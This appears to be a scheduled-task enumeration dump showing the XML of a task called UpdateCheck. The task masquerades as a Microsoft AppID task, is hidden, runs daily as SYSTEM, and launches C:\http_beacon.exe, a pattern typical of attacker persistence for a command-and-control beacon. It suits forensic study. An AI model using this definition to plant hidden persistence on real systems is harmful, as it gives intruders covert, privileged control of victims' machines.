```
Task 16
Name: UpdateCheck
Path: \Microsoft\Windows\AppID\UpdateCheck
Enabled: True
Last Run: 11/30/1999
Next Run: 8/25/2026 7:00:00 AM
Current State: READY
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.5" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <SecurityDescriptor>D:(A;;GA;;;SY)(A;;RCGXGR;;;BA)</SecurityDescriptor>
    <Author>AuthorName</Author>
    <Description>Task starts after at a specified time.</Description>
    <URI>\Microsoft\Windows\AppID\UpdateCheck</URI>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Hidden>true</Hidden>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
  </Settings>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2026-08-25T07:00:00</StartBoundary>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>C:\http_beacon.exe</Command>
    </Exec>
  </Actions>
</Task>
```